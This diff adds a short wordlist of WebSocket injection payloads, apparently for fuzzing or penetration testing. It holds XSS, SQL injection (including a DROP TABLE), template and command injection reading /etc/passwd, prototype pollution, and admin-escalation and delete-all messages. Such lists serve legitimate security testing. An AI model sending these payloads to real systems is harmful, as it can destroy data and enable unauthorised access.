@@ -1,0 +1,16 @@
+# WebSocket injection payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+' OR 1=1--
+"; DROP TABLE users;--
+{{7*7}}
+${7*7}
+; ls -la
+| cat /etc/passwd
+{"__proto__":{"admin":true}}
+{"admin":true,"role":"admin"}
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+null
+undefined
+{"type":"subscribe","channel":"admin"}
+{"action":"delete","id":"*"}
